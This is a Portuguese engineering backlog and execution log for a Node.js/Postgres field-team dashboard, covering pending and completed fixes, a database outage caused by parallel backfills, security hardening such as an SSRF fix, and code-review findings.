- **Depende de:** P3-1 (fica natural no split de rotas).

## P3-4 — Serialização temporal do cron

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de pipeline 2026-07-08
- **Evidência:** `upsertSubcatTotals` intraday pode rodar depois do wipe do
  `consolidateDay` e re-inserir linhas parciais.
- **Ação:** Flag `_consolidating: Set(dates)` bloqueia upsert intraday em
  datas em consolidação.
- **Esforço:** meio dia.
- **Depende de:** P0-3 (consolidação transacional).

## P3-5 — Cap de range em endpoints de histórico

- **Categoria:** Dados
- **Status:** pending
- **Evidência:** `db/queries.js:950, 230, 616` carregam JSONB completo dos
  snapshots. Export de 60+ dias pode causar OOM.
- **Ação:** Rejeitar range > 62 dias com 400 nas rotas de export/histórico.
- **Esforço:** 1h.

## P3-6 — Índice de expressão em `note_details`

- **Categoria:** Dados
- **Status:** pending
- **Evidência:** `db/deslocamentosQueries.js:150-163` filtra por
  `(payload->'checkpoints'->0->>'timestamp')::timestamptz` sem índice.
- **Ação:** `CREATE INDEX idx_nd_first_cp ON note_details ((payload->'checkpoints'->0->>'timestamp'))`.
- **Esforço:** 30min.

## P3-7 — `pg_advisory_xact_lock` no `pushTeams`

- **Categoria:** Dados
- **Status:** pending
- **Evidência:** `dataWriter.js:16-19,64-70` — lock in-process. Se um dia
  escalar PM2 pra 2 instâncias, quebra.
- **Ação:** Substituir por advisory lock via Postgres (cross-process).
- **Esforço:** 2h.

## P3-8 — Remover código morto Vercel/Supabase-remote

- **Categoria:** Backend
- **Status:** **done** (22/07/2026) — feito junto com a **Fase 4** (cutover +
  aposentadoria do Vercel). Spec: `specs/aposentar-vercel-supabase-remote.md`.
- **Evidência:** `server.js:101-102` branch `VERCEL`; `vercel.json` na raiz;
  `routes/cron.js:1-15` doc de Vercel Cron; `dbClient.js:34-41` modo
  supabase; `@supabase/supabase-js` no `package.json`.
- **Ação:** Remover. Historia fica no git.
- **Esforço:** meio dia.
- **Feito em:** 22/07/2026 (Fase 4 + P3-8, do spec via `/spec`).
  - `vercel.json` deletado. Branches `process.env.VERCEL` removidos
    (`server.js` guard, `logger.js` IS_PROD, campos VERCEL do endpoint de
    diagnóstico, teste `IS_PROD com VERCEL=1`). Grep de `process.env.VERCEL` no
    repo → zero.
  - `dbClient.js` agora é **pg-only** (removido o branch supabase, o
    `createClient` e a URL hardcoded do projeto Supabase); sem `DATABASE_URL` →
    erro claro. Dependência `@supabase/supabase-js` removida do `package.json`
    + lock + `node_modules` (`npm uninstall`; `npm ls` → empty).
  - Modo `DATA_MODE=supabase` removido (branch no `/teams`); só `wpa`/`mock`
    válidos. Comentários/headers de `sbq()`, `cron()`, `db/queries.js` e
    `routes/cron.js` de-Vercelizados.
  - Deletados os 2 scripts que batiam no Supabase remoto
    (`scripts/migrate-supabase-to-local.js`, `scripts/diag-rejection-endpoints.js`).
  - **Correção durante o build:** `getTeamsFromSupabase` NÃO era órfã (o grep
    de aceite pegou 2 call-sites vivos que leem `teams_current` via pgShim);
    em vez de deletar, foi **renomeada** `getTeamsCurrent` (nome honesto) e os
    call-sites atualizados. Ver seção 10 do spec.
  - **Deploy (VM):** `git pull` + `npm prune` (funciona na VM) + restart PM2.
    `.env` (SUPABASE_*) fica pra limpar depois — inerte após esta mudança.
  - Suíte 266/266.

## P3-9 — Constantes duplicadas em módulo único

- **Categoria:** Backend
- **Status:** pending
- **Evidência:** `['DESG','DEPT','DESC','DSSJ']` em 4 lugares;
  `ENGELMIG_COMPANY_ID` em 3.
- **Ação:** Exportar `SETORES` e `ENGELMIG_COMPANY_ID` de `services/regionals.js`
  (extensão do módulo pequeno já existente).
- **Esforço:** 1h.

## P3-10 — Acessibilidade básica

- **Categoria:** Frontend
- **Status:** pending
- **Evidência:** Grep confirma 0 `aria-*`, 0 `role`, 0 `tabindex`. 22
  divs/spans com `onclick`.
- **Ação:** Trocar interativos por `<button>` estilizado. Adicionar
  `role="tablist"/tab` nas abas. Faça oportunisticamente ao mexer em cada
  aba pelo split (P3-2).
- **Esforço:** distribuído ao longo do split.

## P3-11 — "Andamento" ao vivo retém notas transferidas/canceladas no meio do dia

- **Categoria:** Dados/Frontend
- **Status:** **done** (22/07/2026) — `_accRecord` passou a sobrescrever o status
  acumulado (upgrade executada→concluida→rejeitada, nunca congela) e `_accApply`
  só re-injeta andamento acumulado quando o payload da equipe veio VAZIO (fallback
  de falha de coleta); com payload íntegro, andamento = ao vivo. Concluídas/
  rejeitadas seguem re-injetando sempre (produção + poda de rejeição preservadas).
  Coberto por `test/accumulator.test.js` (7 testes: transferida sai do andamento,
  guard de payload vazio, upgrade de estado, poda de rejeição, no-dup relogin).
- **Fonte:** Auditoria de veracidade 22/07/2026 (`scripts/audit-indicadores.js`,
  2 rodadas independentes).
- **Evidência:** ~8 notas (em 111 equipes) apareciam em "andamento" no painel
  com UUIDs ausentes de TODAS as listas ao vivo da WPA do dia (ex.: equipes
  ECGPR82, ECGPR90, EPANC30, EPGPR31/32, EPCIT30, EPPIU31 — UUIDs tipo
  `9573b78a…`, `fffce16e…`, estáveis entre as duas rodadas). Causa: o acumulador
  `_acc` (services/wpaService.js) preserva `notasExecutadas` vistas durante o
  dia (necessário pra sobreviver a relogins), mas nada as remove quando a EDP
  transfere/cancela a nota no meio do dia — ela some do payload e fica retida
  como "andamento" até o dia virar.
- **Impacto:** BAIXO — "andamento" é transiente e NÃO entra na produtividade
  reportada à EDP (que conta só concluídas). Infla o card "Em andamento" em
  ~1 nota nas equipes afetadas.
- **Ação:** no merge do `_acc`, remover de `notasExecutadas` acumuladas as notas
  que (a) não estão em nenhum bucket do payload atual E (b) não estão em
  concluídas/rejeitadas — i.e., tratá-las como saída de carteira (transferida/
  cancelada), espelhando o diff 1º/último snapshot do dia (`_buildDiaSummary`).
  Cuidado pra NÃO remover em falha de coleta (payload vazio por erro ≠ nota
  transferida) — só remover quando o payload da equipe veio íntegro.
- **Aceite:** auditoria (`audit-indicadores.js`) sem UUIDs hex órfãos em
  "andamento" em 2 rodadas consecutivas; nenhuma regressão em relogin
  (teste ECCSJ82 continua verde).
- **Esforço:** 2-4h (a parte difícil é o guard de payload íntegro).
- **Rollback:** reverter o commit.

---

# Log de execução

Ao concluir um item, mova pra cá com data + hash do commit:

- **2026-07-08 · `a8dcbab`** — **P0-4** e **P0-5** concluídos. `enforceTeamRegional`
  e POST `/metas` deixaram de ler `req.user.regional` (singular, morto no v=2)
  e passaram a usar `req.user.regionals` (array). Bônus: `server.js` só faz
  `listen()` quando executado direto (`require.main === module`), destravando
  testes de contrato. Novo `test/routes.test.js` (primeiro teste de rota do
  projeto) cobre login + o fix P0-5. Suíte 152→158.

- **2026-07-08 · `f8b839b`** — **P0-3** concluído (partes A, B, C):
  - A: extraído `_aggregateTeamDailyTotals` (puro), `_sessionDate`/`_notaDate`
    exportados. `test/dataWriter.test.js` — 14 casos travando a regra de
    atribuição de dia.
  - B: `test/diaSummary.test.js` — 8 casos com pool fake travando a aritmética
    de buckets e a invariante `inicial+entradas = atual+and+conc+rej+canc`.
  - C: `runDailyDriftSweep` varre D-1..D-7 (era só D-1 e D-7). Mitiga o
    `consolidateDay` não-atômico (crash que zere um dia é reparado até 02:00).
  - A **transação atômica do `consolidateDay`** foi deliberadamente rebaixada
    pra **P1-11**: reescrever o coração da consolidação sem staging tem risco
    maior de corromper números do contrato do que a rara janela de crash (ms
    entre DELETE e INSERT), agora coberta pelo drift-sweep D-1..D-7. Fazer só
    com staging ou janela de manutenção supervisionada + teste de crash.
  - Suíte 158→180.

- **2026-07-08/09 · `bbc5129`, `e4dc4c8`, `c62bf4a`, `4a8e369`, `fa62e12`, `d2970da`**
  — Sequência de P1 concluída: `/health` real + SSRF `/wpa/probe` + remoção de
  stack trace (P1-2/4/10); snapshot_last_ok + git hook pre-push + watchdog
  script (P1-1/3/6); vendorização Leaflet+Roboto (P1-9); retry natural
  MD/SF/DD (P1-7); rate limit + scrypt com compat (P1-5). E `d2970da`:
  `detectDrift` passou a usar `_aggregateTeamDailyTotals` (dedup por note-id +
  `_notaDate`) — antes contava ocorrências infladas e gerava drift fantasma.

- **2026-07-09 · INCIDENTE (Postgres down) + recuperação completa** — Ver P0-0.
  Resumo: backfill rodado como **60 processos node paralelos** derrubou o
  Postgres por OOM (VM 3.8GB sem swap). Banco ficou `down` ~2min, auto-recuperou
  via systemd. Produção restaurada (`pm2 restart` + reconexão). **Bug de
  over-counting confirmado e corrigido**: equipe que reloga carrega as mesmas
  concluídas em cada sessão → produtividade inflava ~8x (ECCSJ82: 18 notas
  reais → 143). O fix de dedup (já em código) + `detectDrift` alinhado (d2970da)
  zeraram o drift. **Todo o histórico 09/05→08/07 re-consolidado** com backfill
  de **1 processo, sequencial** (30s, sem incidente). Validação: 01/07 diff
  1810→854→0; amostras 15/06, 30/06, 05/07 todas `has_drift: false`. Números
  reportados à EDP agora corretos. Abriu **P0-0** (swap + auto-restart + backfill
  discipline). Lição no RUNBOOK: NUNCA backfill em N processos.

**Restam em P0:** P0-0 (swap + auto-restart — pedido à TI), P0-1 (continuidade
humana — organizacional), P0-2 (backup offsite — rclone + OneDrive). Todos
exigem ação na VM/organização; não são executáveis por AI sozinha.

**P1 restante:** P1-11 (`consolidateDay` transacional — requer staging).

- **2026-07-08 · `bbc5129`** — **P1-2, P1-4, P1-10**. `/health` movido pra antes
  do catch-all + check real (SELECT 1 + idade do snapshot, 503 se degradado).
  SSRF do `/api/wpa/probe` fechado (`_wpaPathSeguro`: exige `/api/`, proíbe
  host embutido) — 2 testes de contrato. Stack trace parou de vazar ao cliente.

- **2026-07-08 · `e4dc4c8`** — **P1-3, P1-6, P1-1(script)**. `snapshot_last_ok`/
  `snapshot_error` em `app_settings`, expostos em `/admin/health`
  (`snapshot_stale_min`). Git hook `pre-push` roda `node --test` (via
  `hooks/pre-push` + `scripts/install-hooks.sh`). `scripts/watchdog.sh` pronto
  — **falta o José**: criar Teams Incoming Webhook + agendar no crontab
  (`*/15 * * * *`). Instruções no cabeçalho do script.

- **2026-07-08 · `c62bf4a`** — **P1-9**. Leaflet (js+css+imagens),
  polylineDecorator e Roboto (4 TTF) vendorizados em `vendor/`. Zero CDN no
  `index.html` — Fortinet não derruba mais Mapa/Deslocamentos.

- **2026-07-08 · `4a8e369`** — **P1-7**. `safeJson` distingue transiente (5xx/
  rede → retry) de definitivo (4xx → OUTROS). MD/SF/DD retornam null em falha
  transiente do fetch primário → UUID fica fora do cache e retenta no ciclo
  seguinte. 5 testes novos. **Nota:** cobre subcategorias (MD/SF/DD). As
  REJEIÇÕES (`classificarRejeicao`) ainda gravam "sem motivo" em fetch falho —
  fica como sub-item pendente de P1-7 (mesmo padrão: retornar null em
  FETCH_FAILED e o caller `runClassifyRejections` pular). Menor impacto (é
  indicador secundário), mas vale fechar.

**Próximo item de código puro:** P1-5 (rate limit `/auth/login` + scrypt).
Depois entra P2. P0-1/P0-2/P1-1(config)/P1-11 dependem de você (VM/org/staging).

---

# Como adicionar novo item ao backlog

1. Descubra a categoria (Governança/Segurança/Dados/Ops/Backend/Frontend/Qualidade).
2. Avalie severidade contra o contrato EDP (P0 se ameaça contrato, P1 se
   ameaça continuidade operacional, P2 se ameaça velocidade de resposta,
   P3 se é higiene).
3. Colete evidência `file:line` — se não tiver, ache antes.
4. Escreva no formato dos itens acima. **Não pule campos.**
5. Insira na posição correta por severidade (não anexe no fim se for P0).
6. Renumere se necessário (`P1-N` → mantenha únicos).
7. Commit com mensagem `docs(backlog): adiciona item P1-N — <título curto>`.

## P3-12 — `_hojeBRT` com `-3h` fixo sobrevive em 5 lugares, apesar do `timeUtil`

- **Categoria:** Backend / Higiene
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/timeUtil.js:5-13` existe **exatamente** para matar o
  hack, e o comentário lista o motivo ("Brasil pode reativar horário de verão").
  Mas o `-3h` fixo continua em `services/dataService.js:24` e `:135`,
  `services/cronService.js:781` e `:885`, e `services/wpaService.js:169` —
  enquanto `dataWriter.js:13-15` usa `dateBRT()`.
- **Impacto:** latente. Hoje as duas versões concordam (offset fixo desde 2019).
  Se o DST voltar, `dataService._hojeBRT()` e o `date` gravado por `saveSnapshot`
  divergem por uma hora todo dia — snapshot gravado em `date=D` sendo buscado
  como `D-1`, com efeito direto no `_enrichComEscalaELogonReal` e nos dois
  `datasParaConsolidar` do cron.
- **Ação:** ⬜ trocar as 5 ocorrências por `dateBRT()`/`dateBRTMinusDays()`.
- **Esforço:** 1h + suíte.
- **Relacionado:** P1-14, P3-9.

---

## P3-13 — O snapshot persiste os campos internos `_*`, incluindo uma cópia da carteira inicial do dia

- **Categoria:** Dados / Ops
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/dataWriter.js:54` grava `data: t` — o objeto **já
  enriquecido**, porque `saveSnapshot` é chamado depois dos enrichs
  (`cronService.js:133` → `:163`). Entre os campos vai
  `t._carteiraInicialUUIDs`, que é a lista de UUIDs lida do **primeiro** snapshot
  do dia (`dataService.js:271`).
- **Impacto:** cada um dos ~96 snapshots diários por equipe carrega essa lista
  redundante; contribui direto para os ~16 MB/dia citados em `dataWriter.js:919`,
  numa tabela retida para sempre. Sem efeito em número nenhum.
- **Ação:** ⬜ remover as chaves que começam com `_` antes do insert.
- **Esforço:** 30min.
- **Relacionado:** P2-26, retenção ilimitada de snapshots.

---

## P3-14 — Higiene apontada pela revisão paralela (5 itens pequenos, conferidos)

- **Categoria:** Backend / Dados / Higiene
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026.
- **Lista:**
  1. **Índice prometido em comentário que não existe.**
     `services/dataService.js:480` afirma *"índice em (date, team_name,
     captured_at) torna isso barato"*; os índices reais de `snapshots` são só
     `(captured_at DESC)` e `(date, team_name)` (`db/schema-atual.sql:747-757`).
     Os `DISTINCT ON (team_name) … ORDER BY team_name, captured_at`
     (`dataService.js:232-241`, `:343-361`; `dataWriter.js:989-997`) fazem sort
     numa tabela retida para sempre. Criar o índice de 3 colunas.
  2. **`tipoCode: n.Type || '??'` entra na agregação como tipo válido.**
     `wpaService.js:808` e `:1135` produzem `'??'`; `_aggregateTeamDailyTotals`
     só barra falsy (`dataWriter.js:398`). Nota sem `Type` gravaria
     `team_daily_totals.tipo_code = '??'`, criando coluna fantasma na matriz de
     tipos, e nenhum ponto de leitura filtra o valor. Ocorrência real não
     observada.
  3. **Armadilha no `pgShim.upsert`:** `cols` é a UNIÃO das chaves de todas as
     linhas do lote e ausência vira NULL explícito (`services/pgShim.js:294-297`),
     incluído no `DO UPDATE SET` (`:310`) → uma linha sem a chave **apaga** o
     valor existente. Hoje inofensivo (os lotes do dataWriter são homogêneos),
     mas espera o próximo upsert parcial. Comentário de aviso ou `COALESCE`.
  4. **`getSummary` reintroduz os 4 setores em paralelo** —
     `dataService.js:627-628` faz `Promise.all` × `Promise.all`, o padrão que o
     próprio arquivo proíbe por escrito em `:558-566` (*"com 4 setores em paralelo
     chegava-se a ~240 fetches simultâneos… notas vinham vazias
     intermitentemente"*). **Verificado: `/api/summary` não é chamado por nada no
     front** (0 refs em `public/`), então é armadilha adormecida, não incidente
     ativo. Serializar ou remover a rota.
  5. **`catch` que engole erro de dado sem registrar:**
     `cronService.js:685` (`if (!error) gravadas += …` — falha do upsert de
     `note_rejections` não é logada nem contada); `cronService.js:363-367`
     (`} catch {}` no `getSubcategoriasByIds` → cai da classificação
     autoritativa para a heurística e **persiste** o resultado);
     `dataService.js:123` e `:151` (`if (error) break;` em duas paginações,
     documentado como "falha silenciosa" em `:85-86`, sem `log.warn`). Todos
     viram `log.warn` com motivo.
- **Esforço:** 3h no conjunto.
- **Relacionado:** P2-25, P2-26, P3-6.

---

## Nota — o que a revisão paralela de 20/08/2026 checou e encontrou LIMPO

Registrado porque "não achamos nada" também é evidência, e evita re-auditar:

- **`Math.max` entre fontes: não existe.** As 8 ocorrências em `services/`,
  `db/` e `routes/` são clamps de parâmetro ou threshold de drift. O code smell
  que o CLAUDE.md proíbe (e que causou o incidente original) está ausente.
- **Subcategorias × total geral: a regra de rejeição é a mesma.**
  `upsertSubcatTotals` (`dataWriter.js:470-474`) e `_aggregateTeamDailyTotals`
  (`:392-396`) montam o mesmo `_rejIds` a partir de `t.notasRejeitadas`, e o
  P1-16 injeta ali — os dois herdam a regra por construção. A única assimetria é
  a nota sem `id` (P2-27).
- **Régua D × D+1: nenhum consumidor divergente novo.** `health-check.js:88`
  varre `D-DIAS..D-1` (não toca o dia em curso) e o `verify-consolidacao.js`
  documenta a régua D+1 no cabeçalho.
- **Carteira inicial degrada com log, não em silêncio.**
  `_enrichCarteiraInicial` usa `DISTINCT ON … ORDER BY captured_at ASC`, então
  equipe ausente do primeiro snapshot cai no primeiro em que aparecer, e o
  console imprime `N/total equipes com primeiro snapshot do dia`.
- **Formato de data no parâmetro da API está certo.** `toWpaDate`
  (`wpaService.js:670-673`) produz `M/D/YYYY` — mês primeiro, igual ao
  `%m/%d/%Y` deles. Sem o bug clássico de "funciona até o dia 12".
- **Acesso aninhado a dado da EDP é consistente.** A varredura por
  `.Team|.Session|.Data|.Vehicle|.Sector|.Collaborator` sem `?.` devolveu 2 hits,
  ambos já guardados por condicional na mesma expressão (`routes/index.js:1287`,
  `:1326`).
- **Whitelist é aplicada ANTES de toda soma.** `_onlyOficiais` cobre os ~22
  pontos de `db/queries.js`; `daily_totals`/`daily_subcat_totals` foram
  aposentados deliberadamente por isso (`dataWriter.js:354-362`). Nenhum total
  intermediário exibido inclui equipe fora da whitelist.
- **Contagem por UUID confirmada** em `bucketMath.js:45-47`,
  `_aggregateTeamDailyTotals` e `upsertSubcatTotals`. Os furos são só os do
  P1-27, P1-34 e P2-27.

---
